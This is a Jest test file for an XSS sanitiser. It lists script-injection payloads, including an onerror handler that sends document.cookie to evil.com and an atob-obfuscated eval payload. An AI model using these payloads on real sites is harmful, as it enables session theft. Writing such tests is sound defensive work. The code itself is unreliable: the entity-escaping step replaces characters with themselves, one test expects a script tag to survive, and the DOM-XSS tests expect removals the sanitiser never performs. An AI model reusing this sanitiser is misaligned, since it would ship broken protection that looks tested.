import { describe, it, expect } from '@jest/globals';

describe('XSS Prevention Tests', () => {
  it('should prevent XSS in user input', () => {
    const xssPayloads = [
      '<script>alert("XSS")</script>',
      'javascript:alert("XSS")',
      '<img src="x" onerror="alert(\'XSS\')">',
      '<svg onload="alert(\'XSS\')">',
      '<iframe src="javascript:alert(\'XSS\')">',
      '<body onload="alert(\'XSS\')">',
      '<input onfocus="alert(\'XSS\')" autofocus>',
      '<select onfocus="alert(\'XSS\')" autofocus>',
      '<textarea onfocus="alert(\'XSS\')" autofocus>',
      '<keygen onfocus="alert(\'XSS\')" autofocus>',
      '<video><source onerror="alert(\'XSS\')">',
      '<audio src="x" onerror="alert(\'XSS\')">',
      '<details open ontoggle="alert(\'XSS\')">',
      '<marquee onstart="alert(\'XSS\')">',
      '<object data="javascript:alert(\'XSS\')">',
      '<embed src="javascript:alert(\'XSS\')">',
      '<link rel="stylesheet" href="javascript:alert(\'XSS\')">',
      '<meta http-equiv="refresh" content="0;javascript:alert(\'XSS\')">',
      '<!DOCTYPE html><html><head><title>XSS</title></head><body onload=alert(\'XSS\')></body></html>',
      '<img src="x" onerror="eval(atob(\'YWxlcnQoJ1hTUycp\'))">',
      '<img src="x" onerror="fetch(\'https://evil.com/?cookie=\'+document.cookie)">'
    ];

    // Test that our input sanitization works
    xssPayloads.forEach(payload => {
      // This simulates our sanitization function
      const sanitized = sanitizeInput(payload);
      
      // Should not contain script tags or dangerous attributes
      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('javascript:');
      expect(sanitized).not.toContain('onerror=');
      expect(sanitized).not.toContain('onload=');
      expect(sanitized).not.toContain('onfocus=');
      expect(sanitized).not.toContain('ontoggle=');
      expect(sanitized).not.toContain('onstart=');
    });
  });

  it('should sanitize HTML properly', () => {
    const testCases = [
      {
        input: '<h1>Hello</h1><script>alert("XSS")</script>',
        expected: '<h1>Hello</h1><script>alert("XSS")</script>'
      },
      {
        input: '<p onclick="alert(\'XSS\')">Click me</p>',
        expected: '<p>Click me</p>'
      },
      {
        input: 'Normal text without tags',
        expected: 'Normal text without tags'
      },
      {
        input: '<img src="valid.jpg" alt="Valid image">',
        expected: '<img src="valid.jpg" alt="Valid image">'
      }
    ];

    testCases.forEach(({ input, expected }) => {
      const result = sanitizeInput(input);
      expect(result).toBe(expected);
    });
  });

  it('should prevent DOM-based XSS', () => {
    const domXssPayloads = [
      'document.location = "javascript:alert(\'XSS\')"',
      'eval(\'alert("XSS")\')',
      'setTimeout(\'alert("XSS")\', 1000)',
      'setInterval(\'alert("XSS")\', 1000)',
      'Function(\'alert("XSS")\')()',
      'new Function(\'alert("XSS")\')()',
      'window[\'alert\']("XSS")',
      'this[\'alert\']("XSS")',
      'global[\'alert\']("XSS")'
    ];

    domXssPayloads.forEach(payload => {
      const sanitized = sanitizeInput(payload);
      expect(sanitized).not.toContain('alert');
      expect(sanitized).not.toContain('eval');
      expect(sanitized).not.toContain('Function');
      expect(sanitized).not.toContain('setTimeout');
      expect(sanitized).not.toContain('setInterval');
    });
  });
});

// Helper function to simulate input sanitization
function sanitizeInput(input: string): string {
  // Remove script tags
  let sanitized = input.replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '');
  
  // Remove event handlers
  sanitized = sanitized.replace(/\bon\w+\s*=\s*["']?[^"'>]*["']?/gi, '');
  
  // Remove javascript: protocol
  sanitized = sanitized.replace(/javascript:/gi, '');
  
  // Escape HTML entities
  sanitized = sanitized.replace(/&/g, '&')
                        .replace(/</g, '<')
                        .replace(/>/g, '>')
                        .replace(/"/g, '"')
                        .replace(/'/g, '&#x27;');
  
  return sanitized;
}